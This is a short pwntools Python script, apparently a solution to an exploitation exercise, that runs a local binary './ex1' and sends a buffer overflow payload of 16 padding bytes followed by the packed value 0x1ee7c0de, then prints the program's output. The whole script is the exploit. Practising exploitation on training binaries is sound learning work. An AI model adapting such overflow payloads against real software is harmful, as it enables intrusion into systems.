#! /usr/bin/python3

from pwn import *

io = process('./ex1')
print(io.recvline().decode())
io.sendline(b'A' * 0x10 + pack(0x1ee7c0de))
for _ in range(10):
    try:
        print(io.readline(keepends=False))
    except EOFError:
        pass